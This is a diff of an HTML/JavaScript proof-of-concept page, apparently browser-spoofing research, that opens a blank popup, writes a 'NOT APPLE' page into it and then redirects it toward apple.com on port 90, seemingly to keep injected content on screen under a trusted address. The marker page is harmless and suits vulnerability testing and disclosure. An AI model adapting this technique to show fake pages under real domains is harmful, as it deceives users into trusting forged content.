@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
-    <title>Advanced Context Replacement & Bypass PoC</title>
+    <title>About:Blank Bypass & Port 90 PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -44,32 +44,31 @@
   </head>
   <body>
     <div class="container">
-      <button id="bypassBtn">INITIALIZE CONTEXT BYPASS</button>
+      <button id="execBtn">INITIALIZE BYPASS & PORT 90 TEST</button>
       <div class="info" id="statusInfo">Status: Ready for interaction.</div>
     </div>
 
     <script>
-      // Menggunakan deklarasi let sesuai preferensi struktur kode
-      let bypassButton = document.getElementById("bypassBtn");
+      let execButton = document.getElementById("execBtn");
       let statusInfo = document.getElementById("statusInfo");
 
-      bypassButton.onclick = function () {
-        statusInfo.innerText = "Status: Opening blank context window...";
+      execButton.onclick = function () {
+        statusInfo.innerText = "Status: Opening blank context window (Bypassing initial load)...";
         this.style.display = "none";
 
-        // 1. Membuka jendela baru kosong (secara otomatis memuat konteks about:blank)
+        // 1. Membuka jendela baru kosong tanpa URL awal (metode bypass about:blank murni)
         let targetWindow = window.open("", "_blank");
 
         if (!targetWindow) {
           statusInfo.innerText = "Status: Execution halted - Pop-up blocked by browser policy.";
-          bypassButton.style.display = "block";
+          execButton.style.display = "block";
           return;
         }
 
         try {
-          statusInfo.innerText = "Status: Injecting custom deceptive DOM structure...";
+          statusInfo.innerText = "Status: Injecting deceptive DOM structure...";
 
-          // 2. Menyuntikkan konten HTML kustom secara instan untuk menggantikan status blank
+          // 2. Menyuntikkan payload HTML secara instan ke dalam konteks jendela baru
           let payloadHTML = `
             <!DOCTYPE html>
             <html>
@@ -84,14 +83,14 @@
                   height: 100vh; text-align: center; padding: 20px; box-sizing: border-box;
                 }
                 .wrapper { width: 100%; max-width: 500px; }
-                h1 { font-size: 38px; color: #d70015; margin-bottom: 12px; font-weight: 700; }
-                p { font-size: 20px; color: #0066cc; font-weight: 500; margin: 0; }
+                h1 { font-size: 40px; color: #d70015; margin-bottom: 12px; font-weight: 700; }
+                p { font-size: 22px; color: #0066cc; font-weight: 500; margin: 0; }
               </style>
             </head>
             <body>
               <div class="wrapper">
                 <h1>NOT APPLE</h1>
-                <p>Context Injection & Replacement Active</p>
+                <p>Custom Port 90 State Evaluation</p>
               </div>
             </body>
             </html>
@@ -101,22 +100,21 @@
           targetWindow.document.write(payloadHTML);
           targetWindow.document.close();
 
-          statusInfo.innerText = "Status: DOM injected successfully. Preparing history replacement...";
+          statusInfo.innerText = "Status: DOM committed. Synchronizing timing sequence...";
 
-          // 3. Menggunakan window.location.replace() untuk menguji navigasi tingkat lanjut 
-          // tanpa mencemari session history browser dengan status kosong.
+          // 3. Menggunakan location.replace dengan port 90 setelah jeda waktu render
           setTimeout(() => {
             try {
-              statusInfo.innerText = "Status: Executing location.replace toward target...";
+              statusInfo.innerText = "Status: Dispatching transition to apple.com:90...";
               
-              // Mengganti riwayat aktif dengan URL target valid (misalnya apple.com)
-              targetWindow.location.replace("https://apple.com");
+              // Mengarahkan ke target menggunakan port 90
+              targetWindow.location.replace("https://apple.com:90");
 
-              statusInfo.innerText = "Status: Chain executed completely via location.replace.";
+              statusInfo.innerText = "Status: Transition dispatched successfully.";
             } catch (navError) {
-              statusInfo.innerText = "Status: Replacement restricted by security policy: " + navError.message;
+              statusInfo.innerText = "Status: Navigation restricted: " + navError.message;
             }
-          }, 1200);
+          }, 1000);
 
         } catch (err) {
           statusInfo.innerText = "Status: Execution error encountered: " + err.message;
